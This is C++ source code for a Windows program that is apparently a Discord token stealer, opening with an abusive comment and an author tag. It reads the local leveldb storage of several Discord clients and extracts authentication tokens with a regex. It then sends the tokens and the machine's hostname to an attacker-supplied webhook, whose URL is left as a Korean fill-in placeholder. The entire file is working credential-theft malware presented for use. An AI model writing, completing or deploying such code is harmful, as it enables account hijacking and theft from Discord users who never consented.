// fuck you bitch
// by tubero 03

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <regex>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <filesystem>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

namespace fs = std::filesystem;

static const wchar_t* kHook = L"니웹훅입력";

static std::wstring localAppData() {
    PWSTR p = nullptr;
    std::wstring r;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &p))) {
        r = p;
        CoTaskMemFree(p);
    }
    return r;
}

static std::string slurp(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return {};
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

static std::vector<fs::path> collect() {
    std::vector<fs::path> out;
    auto base = fs::path(localAppData());
    const wchar_t* subs[] = {
        L"discord\\Local Storage\\leveldb",
        L"discordcanary\\Local Storage\\leveldb",
        L"discordptb\\Local Storage\\leveldb",
        L"discorddevelopment\\Local Storage\\leveldb",
        L"Lightcord\\Local Storage\\leveldb",
    };
    for (auto s : subs) {
        auto dir = base / s;
        std::error_code ec;
        if (!fs::is_directory(dir, ec)) continue;
        for (auto& e : fs::directory_iterator(dir, ec)) {
            if (ec) break;
            if (!e.is_regular_file()) continue;
            auto ext = e.path().extension().wstring();
            if (ext == L".ldb" || ext == L".log")
                out.push_back(e.path());
        }
    }
    return out;
}

static std::vector<std::string> harvest(const std::string& buf) {
    static const std::regex pat(
        R"(([A-Za-z0-9_\-]{24,28}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,40}))"
    );
    std::vector<std::string> v;
    for (auto it = std::sregex_iterator(buf.begin(), buf.end(), pat);
         it != std::sregex_iterator(); ++it) {
        v.push_back(it->str(1));
    }
    return v;
}

static std::string esc(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 8);
    for (char c : s) {
        if (c == '"' || c == '\\') { o += '\\'; o += c; }
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else if ((unsigned char)c < 0x20) continue;
        else o += c;
    }
    return o;
}

static void push(const std::wstring& url, const std::string& body) {
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256]{}, path[2048]{};
    uc.lpszHostName = host; uc.dwHostNameLength = 255;
    uc.lpszUrlPath = path;  uc.dwUrlPathLength = 2047;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc)) return;

    HINTERNET s = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return;
    HINTERNET c = WinHttpConnect(s, host, uc.nPort, 0);
    if (!c) { WinHttpCloseHandle(s); return; }

    DWORD flags = uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path, nullptr,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (r) {
        std::wstring h = L"Content-Type: application/json\r\n";
        if (WinHttpSendRequest(r, h.c_str(), (DWORD)-1, (LPVOID)body.data(),
                               (DWORD)body.size(), (DWORD)body.size(), 0))
            WinHttpReceiveResponse(r, nullptr);
        WinHttpCloseHandle(r);
    }
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
}

static std::string hostname() {
    char b[256]{};
    DWORD n = sizeof(b);
    GetComputerNameA(b, &n);
    return b;
}

int main() {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    auto files = collect();
    if (files.empty()) { CoUninitialize(); return 0; }

    std::vector<std::string> tokens;
    for (auto& f : files) {
        auto blob = slurp(f);
        if (blob.empty()) continue;
        auto got = harvest(blob);
        tokens.insert(tokens.end(), got.begin(), got.end());
    }
    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());

    if (!tokens.empty()) {
        std::ostringstream fields;
        fields << "[{\"name\":\"host\",\"value\":\"" << esc(hostname())
               << "\",\"inline\":false}";
        for (auto& t : tokens) {
            fields << ",{\"name\":\"t\",\"value\":\"```" << esc(t)
                   << "```\",\"inline\":false}";
        }
        fields << "]";

        std::ostringstream body;
        body << "{\"embeds\":[{\"color\":5763719,\"fields\":" << fields.str() << "}]}";
        push(kHook, body.str());
    }

    CoUninitialize();
    return 0;
}